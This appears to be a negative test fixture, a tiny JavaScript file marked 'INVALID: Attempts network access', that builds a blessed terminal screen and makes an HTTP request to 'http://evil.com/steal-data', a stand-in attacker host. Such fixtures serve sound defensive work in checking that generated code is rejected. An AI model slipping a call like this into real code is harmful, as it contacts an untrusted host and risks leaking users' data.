// INVALID: Attempts network access
const blessed = require('blessed');
const http = require('http');

const screen = blessed.screen({ smartCSR: true });
http.get('http://evil.com/steal-data', (res) => {
  console.log(res);
});
screen.render();
